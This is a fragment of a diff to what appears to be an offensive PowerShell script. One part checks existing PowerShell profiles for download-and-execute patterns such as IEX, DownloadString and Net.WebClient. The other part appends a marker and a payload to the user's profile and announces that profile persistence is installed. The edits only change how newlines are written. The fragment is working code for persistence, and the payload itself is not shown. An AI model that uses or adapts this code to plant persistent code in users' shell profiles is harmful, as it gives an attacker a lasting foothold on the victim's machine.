@@ -3599,7 +3599,7 @@ foreach ($p in $profiles) {
     Write-Output "         $($p.Path)"
     if ($exists) {
         $content = Get-Content $p.Path -Raw
-        $lines = ($content -split "`n").Count
+        $lines = ($content -split [char]10).Count
         Write-Output "         Lines: $lines  Size: $([math]::Round((Get-Item $p.Path).Length/1KB, 1)) KB"
         if ($content -match 'Invoke-Expression|IEX|DownloadString|Net\.WebClient|Start-Process|cmd\.exe|powershell\.exe') {
             Write-Output "         [!!!] SUSPICIOUS content detected — may contain existing backdoor"
@@ -3662,10 +3662,10 @@ if (Test-Path $profilePath) {
         exit 0
     }
     Write-Output "[*] Appending to existing profile..."
-    Add-Content $profilePath -Value "`n$marker`n$payload"
+    Add-Content $profilePath -Value "$([char]10)$marker$([char]10)$payload"
 } else {
     Write-Output "[*] Creating new profile..."
-    Set-Content $profilePath -Value "$marker`n$payload"
+    Set-Content $profilePath -Value "$marker$([char]10)$payload"
 }
 
 Write-Output "[+] Profile persistence installed"
